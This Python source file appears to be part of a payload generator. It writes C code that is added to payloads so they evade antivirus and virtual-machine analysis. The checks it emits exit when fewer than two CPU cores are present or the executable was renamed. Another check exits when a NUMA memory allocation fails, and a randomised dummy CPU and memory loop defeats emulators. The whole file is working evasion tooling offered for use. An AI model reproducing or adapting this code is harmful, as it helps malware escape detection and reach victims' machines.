from lib import core
import random


# Add Anti-VM code
def THE_GREAT_EVASION(FILENAME, ARCHITECTURE):
    EVASION = ""

    if ARCHITECTURE == "x86":
        EVASION += NUMBER_OF_CORE()
        EVASION += MY_NAME_IS(FILENAME)
        EVASION += HARD_USAGE()

    else:
        EVASION += HARD_USAGE()
        EVASION += MY_NAME_IS(FILENAME)
        EVASION += NUMBER_OF_CORE()
        EVASION += MONO_CORE()

    core.EVASION_ADDED()

    return EVASION


def NUMBER_OF_CORE():
    # Check number of core
    SYSGUIDE = core.VARNAME_CREATOR()
    CORE = core.VARNAME_CREATOR()
    EVASION = "SYSTEM_INFO " + SYSGUIDE + ";\n"
    EVASION += "GetSystemInfo(&" + SYSGUIDE + ");\n"
    EVASION += "int " + CORE + " = " + SYSGUIDE + ".dwNumberOfProcessors;\n"
    EVASION += "if (" + CORE + " < 2){exit(0);}\n\n"

    return EVASION


def MY_NAME_IS(FILENAME):
    # Check if the begin name is the same
    B = core.VARNAME_CREATOR()
    FILENAME = FILENAME.replace('output/', '')
    EVASION = 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}\n'
    EVASION += "else{exit(0);}\n\n"

    return EVASION


def MONO_CORE():
    # AV have no multiproc
    MEM2 = core.VARNAME_CREATOR()
    EVASION = "LPVOID " + MEM2 + "= NULL;\n"
    EVASION += MEM2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
    EVASION += "if (" + MEM2 + " != NULL){\n"
    EVASION += 'printf("Hello World");}\n'
    EVASION += "else{exit(0);}\n\n"

    return EVASION


def HARD_USAGE():
    # Fake cpu/mem operation
    OP1 = core.VARNAME_CREATOR()
    OP1_VALUE = str(random.randint(6000, 8000))
    ITERATOR1 = core.VARNAME_CREATOR()
    MEM1 = core.VARNAME_CREATOR()
    MEM1_VALUE = str(random.randint(45000000, 60000000))
    EVASION = "int " + OP1 + "= " + OP1_VALUE + ";\n"
    EVASION += "int " + ITERATOR1 + " = 0;\n"
    EVASION += "for (" + ITERATOR1 + " = 0; " + ITERATOR1 + " < " + OP1 + "; " + ITERATOR1 + "++){\n"
    EVASION += 'printf("%d\\n", ' + ITERATOR1 + ');\n'
    EVASION += "char * " + MEM1 + " = NULL;\n"
    EVASION += MEM1 + " = (char * )malloc(" + MEM1_VALUE + ");\n"
    EVASION += "if (" + MEM1 + " != NULL){\n"
    EVASION += "memset(" + MEM1 + ", 00, " + MEM1_VALUE + ");\n"
    EVASION += "free(" + MEM1 + ");}\n"
    EVASION += "else{exit(0);}}\n"
    EVASION += "if (" + ITERATOR1 + " != " + OP1 + "){\n"
    EVASION += "exit(0);}\n\n"

    return EVASION
